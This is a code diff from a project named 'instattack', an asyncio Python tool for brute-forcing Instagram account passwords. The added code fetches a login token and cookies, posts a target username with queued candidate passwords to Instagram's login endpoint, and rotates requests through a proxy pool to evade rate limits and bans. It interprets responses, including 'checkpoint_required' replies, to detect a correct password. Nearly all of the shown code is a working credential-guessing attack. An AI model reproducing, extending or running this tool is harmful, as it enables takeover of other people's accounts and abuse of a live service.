@@ -5,13 +5,18 @@ import aiohttp
 import aiojobs
 import collections
 
+from instattack import settings
+from instattack.exceptions import NoPasswordsError
 from instattack.src.base import HandlerMixin
 from instattack.src.utils import percentage
 
-from .models import InstagramResults
-from .exceptions import NoPasswordsError
-from .requests import RequestHandler
-from .utils import limit_on_success, limit_as_completed
+from .exceptions import (
+    HTTP_REQUEST_ERRORS, HTTP_RESPONSE_ERRORS,
+    find_response_error, find_request_error,
+    HttpResponseError, HttpRequestError, InstagramResultError, HttpFileDescriptorError)
+
+from .models import InstagramResults, InstagramResult
+from .utils import get_token, limit_on_success, limit_as_completed
 
 
 """
@@ -42,17 +47,22 @@ To remedy:
 """
 
 
-class LoginHandler(RequestHandler, HandlerMixin):
+class LoginHandler(HandlerMixin):
 
     __name__ = 'Login Handler'
     __logconfig__ = "login_attempts"
 
     def __init__(self, config, proxy_handler, user=None, start_event=None, stop_event=None):
-        super(LoginHandler, self).__init__(config, proxy_handler)
 
         self.user = user
         self.start_event = start_event
         self.stop_event = stop_event
+        self.config = config
+        self.proxy_handler = proxy_handler
+
+        self._headers = None
+        self._cookies = None
+        self._token = None
 
         self.limit = config['login']['limit']
         self.batch_size = config['login']['batch_size']
@@ -89,7 +99,7 @@ class LoginHandler(RequestHandler, HandlerMixin):
 
         await log.start('Starting Attack')
 
-        scheduler = await aiojobs.create_scheduler(limit=100, exception_handler=None)
+        scheduler = await aiojobs.create_scheduler(limit=10, exception_handler=None)
         results = await self.attempt_login(loop, scheduler)
         return results
 
@@ -110,6 +120,50 @@ class LoginHandler(RequestHandler, HandlerMixin):
             await self.passwords.put(password)
 
         await log.complete(f"Prepopulated {len(passwords)} Password Attempts")
+
+    @property
+    def _connector(self):
+        return aiohttp.TCPConnector(
+            ssl=False,
+            force_close=True,
+            limit=self.config['login']['connection']['limit'],
+            limit_per_host=self.config['login']['connection']['limit_per_host'],
+            enable_cleanup_closed=True,
+        )
+
+    @property
+    def _timeout(self):
+        return aiohttp.ClientTimeout(
+            total=self.config['login']['connection']['timeout']
+        )
+
+    def _login_data(self, password):
+        return {
+            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
+            settings.INSTAGRAM_PASSWORD_FIELD: password
+        }
+
+    @property
+    def headers(self):
+        return self._headers
+
+    @property
+    def token(self):
+        return self._token
+
+    async def cookies(self):
+        if not self._cookies:
+            # TODO: Set timeout to the token timeout.
+            sess = aiohttp.ClientSession(connector=self._connector)
+            self._token, self._cookies = await get_token(sess)
+
+            if not self._token:
+                raise RuntimeError('Could not find token.')
+
+            self._headers = settings.HEADERS(self._token)
+            await sess.close()
+
+        return self._cookies
 
     async def generate_login_tasks(self, loop, session, scheduler):
         """
@@ -142,8 +196,6 @@ class LoginHandler(RequestHandler, HandlerMixin):
         await self.start_event.wait()
         cookies = await self.cookies()
 
-        await log.debug('Starting Client Session')
-
         async with aiohttp.ClientSession(
             connector=self._connector,
             cookies=cookies,
@@ -159,9 +211,6 @@ class LoginHandler(RequestHandler, HandlerMixin):
 
                 self.num_completed += 1
 
-                # TODO: Using the login_index here as the total number only works
-                # because the login_tasks are generated so quickly, we need a more
-                # sustainable way of doing this.
                 await log.success(
                     f'Percent Done: {percentage(self.num_completed, self.num_passwords)}')
 
@@ -245,3 +294,232 @@ class LoginHandler(RequestHandler, HandlerMixin):
                 'other': result
             })
         return result
+
+    async def login_request(self, loop, session, password, proxy, scheduler):
+        """
+        For a given password, makes a series of concurrent requests, each using
+        a different proxy, until a result is found that authenticates or dis-
+        authenticates the given password.
+
+        TODO
+        ----
+        Only remove proxy if the error has occured a certain number of times, we
+        should allow proxies to occasionally throw a single error.
+        """
+        proxy.update_time()
+
+        async def parse_response_result(result, password, proxy):
+            """
+            Raises an exception if the result that was in the response is either
+            non-conclusive or has an error in it.
+
+            If the result does not have an error and is non conslusive, than we
+            can assume that the proxy was most likely good.
+            """
+            result = InstagramResult.from_dict(result, proxy=proxy, password=password)
+            if result.has_error:
+                raise InstagramResultError(result.error_message)
+            else:
+                if not result.conclusive:
+                    raise InstagramResultError("Inconslusive result.")
+                return result
+
+        async def raise_for_result(response):
+            """
+            Since a 400 response will have valid json that can indicate an authentication,
+            via a `checkpoint_required` value, we cannot raise_for_status until after
+            we try to first get the response json.
+            """
+            if response.status != 400:
+                response.raise_for_status()
+                json = await response.json()
+                result = await parse_response_result(json, password, proxy)
+                return result
+            else:
+                # Parse JSON First
+                json = await response.json()
+                try:
+                    return await parse_response_result(json, password, proxy)  # noqa
+                except InstagramResultError as e:
+                    # Be Careful: If this doesn't raise a response the result will be None.
+                    response.raise_for_status()
+
+        try:
+            async with session.post(
+                settings.INSTAGRAM_LOGIN_URL,
+                headers=self.headers,
+                data=self._login_data(password),
+                ssl=False,
+                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
+            ) as response:
+
+                result = await raise_for_result(response)
+                await proxy.handle_success()
+                await self.proxy_handler.pool.put(proxy)
+                await scheduler.spawn(proxy.save())
+
+                return result
+
+        except HTTP_RESPONSE_ERRORS as e:
+            await self.communicate_response_error(e, proxy, scheduler)
+
+        except HTTP_REQUEST_ERRORS as e:
+            await self.communicate_request_error(e, proxy, scheduler)
+
+        # We shouldn't really need this unless we are running over large numbers
+        # of requests... so keep for now.
+        # except RuntimeError as e:
+        #     """
+        #     RuntimeError: File descriptor 87 is used by transport
+        #     <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
+
+        #     All other RuntimeError(s) we want to raise.
+        #     """
+        #     if e.errno == 87:
+        #         e = HttpFileDescriptorError(original=e)
+        #         await self.communicate_request_error(e, proxy, scheduler)
+        #     else:
+        #         raise e
+
+    async def communicate_response_error(self, e, proxy, scheduler):
+        """
+        Creates exception instances that we have established internally so their
+        treatment and handling in regard to proxies and the pool can be determined
+        from the error directly.
+
+        If the error is not an instance of HttpError (our internal error), the
+        internal version of the error will be determined and this method will
+        be called recursively with the created error, that will be an instance
+        of HttpError.
+        """
+        log = self.create_logger('communicate_response_error')
+
+        # These Are Our Errors - Logged in Handle Method
+        if isinstance(e, HttpResponseError):
+            await self.handle_proxy_error(e, proxy, scheduler)
+        else:
+            if isinstance(e, asyncio.CancelledError):
+                await log.debug('Request Cancelled')
+                pass
+            else:
+                # Try to associate the error with one that we are familiar with,
+                # if we cannot find the appropriate error, than we raise it since
+                # we are not aware of this error.
+                err = find_response_error(e)
+                if not err:
+                    raise e
+
+                # Logging might be redundant since our error will be logged in the
+                # subsequent call.
+                await self.communicate_response_error(err, proxy, scheduler)
+
+    async def communicate_request_error(self, e, proxy, scheduler):
+        """
+        Creates exception instances that we have established internally so their
+        treatment and handling in regard to proxies and the pool can be determined
+        from the error directly.
+
+        If the error is not an instance of HttpError (our internal error), the
+        internal version of the error will be determined and this method will
+        be called recursively with the created error, that will be an instance
+        of HttpError.
+        """
+        log = self.create_logger('communicate_request_error')
+
+        # These Are Our Errors - Logged in Handle Method
+        if isinstance(e, HttpRequestError):
+            await self.handle_proxy_error(e, proxy, scheduler)
+        else:
+            if isinstance(e, asyncio.CancelledError):
+                await log.debug('Request Cancelled')
+                pass
+            else:
+                # Try to associate the error with one that we are familiar with,
+                # if we cannot find the appropriate error, than we raise it since
+                # we are not aware of this error.
+                err = find_request_error(e)
+                if not err:
+                    raise e
+
+                # Logging might be redundant since our error will be logged in the
+                # subsequent call.
+                await self.communicate_request_error(err, proxy, scheduler)
+
+    async def handle_proxy_error(self, e, proxy, scheduler):
+        """
+        [1] Fatal Error:
+        ---------------
+        If `remove_invalid_proxy` is set to True and this error occurs,
+        the proxy will be removed from the database.
+        If `remove_invalid_proxy` is False, the proxy will just be noted
+        with the error and the proxy will not be put back in the pool.
+
+        Since we will not delete directly from this method (we need config)
+        we will just note the error.
+
+        [2] Inconclusive Error:
+        ----------------------
+        Proxy will not be noted with the error and the proxy will be put
+        back in pool.
+
+        [3] Semi-Fatal Error:
+        --------------------
+        Regardless of the value of `remove_invalid_proxy`, the  proxy
+        will be noted with the error and the proxy will be removed from
+        the pool.
+
+        [4] General Error:
+        -----------------
+        Proxy will be noted with error but put back in the pool.
+
+        TODO
+        ----
+        Only remove proxy if the error has occured a certain number of times, we
+        should allow proxies to occasionally throw a single error.
+        """
+        log = self.create_logger('handle_proxy_error', ignore_config=True)
+
+        # Allow Manual Treatments
+        await proxy.handle_error(e)
+
+        if e.__treatment__ == 'fatal':
+            if self.config['proxies']['pool']['remove_proxy_on_error']:
+                await log.error(e, extra={
+                    'other': 'FATAL: Deleting Proxy, Removing from Pool',
+                    'proxy': proxy
+                })
+                await scheduler.spawn(proxy.delete())
+            else:
+                await log.error(e, extra={
+                    'other': 'FATAL: Not Deleting Proxy, Removing from Pool',
+                    'proxy': proxy
+                })
+                await scheduler.spawn(proxy.save())
+
+        elif e.__treatment__ in ('semifatal', 'error'):
+            if e.__treatment__ == 'error':
+                await log.error(e, extra={
+                    'other': 'ERROR: Putting Back in Pool',
+                    'proxy': proxy,
+                })
+                await self.proxy_handler.pool.put(proxy)
+            else:
+                await log.error(e, extra={
+                    'other': 'SEMIFATAL: Removing Proxy from Pool',
+                    'proxy': proxy,
+                })
+
+            await scheduler.spawn(proxy.save())
+
+        elif e.__treatment__ == 'inconclusive':
+            # Do not need to save... but we should to make sure the updated time
+            # reflects in other attacks.
+            await log.error(e, extra={
+                'other': 'INCONCLUSIVE: Putting Back in Pool',
+                'proxy': proxy,
+            })
+            await self.proxy_handler.pool.put(proxy)
+            await scheduler.spawn(proxy.save())
+
+        else:
+            raise RuntimeError(f'Invalid treatment {e.__treatment__}.')
